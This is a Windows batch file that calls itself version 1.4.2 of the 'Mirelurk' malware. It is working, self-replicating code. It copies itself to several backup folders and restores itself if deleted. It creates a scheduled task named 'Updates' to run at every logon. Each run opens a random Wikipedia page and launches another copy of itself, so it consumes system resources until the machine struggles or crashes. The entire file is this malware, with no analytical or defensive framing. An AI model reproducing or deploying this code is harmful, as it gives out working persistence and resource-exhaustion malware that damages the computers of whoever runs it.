@echo off

:: Version 1.4.2 of the "Mirelurk" malware.
::
:: This is an evolution of the "Fatal Mudcrab Encounter" malware. As of 1.3.2 this has become
:: the irradiated monstrosity that is "Mirelurk".
::
:: It is a self-replicating file that will eat up all available system resources over time.
:: It is resilient, and makes multiple copies of itself for restoration in case of destruction.
:: To eat up system resources faster, it also opens a random wikipedia article each time it runs.
::
:: CHANGELOG
:: Updated backup locations to be accessible by any user and added a second backup location.

:: Working directories
set original=C:\Users\%USERNAME%\Downloads\mirelurk.bat
set file=C:\Users\%USERNAME%\AppData\Local\mirelurk.bat
set backup=C:\Temp\mirelurk.bat
set backup2=C:\Users\Public\mirelurk.bat

:: Backups
mkdir C:\Temp
copy %original% %file%
copy %original% %backup%
copy %original% %backup2%

:: Recovery
if exist %file% (
	:: If The file exists, check for existing task and create one if not.
	schtasks /query /TN "Updates" >NUL 2>&1
	if %errorlevel% NEQ 0 schtasks /create /tn "Updates" /tr %file% /sc ONLOGON /np /f
) else (
	:: If the original exists, copy that back to the correct directory.
	:: If it doesn't, recover from backup and proceed.
	if not exist %original% (
		if not exist %backup% (
			copy %backup2% %backup%
		)
		copy %backup% %original%
	)
	copy %original% %file%
)

:: Payload
start https://en.wikipedia.org/wiki/Special:Random
start %file%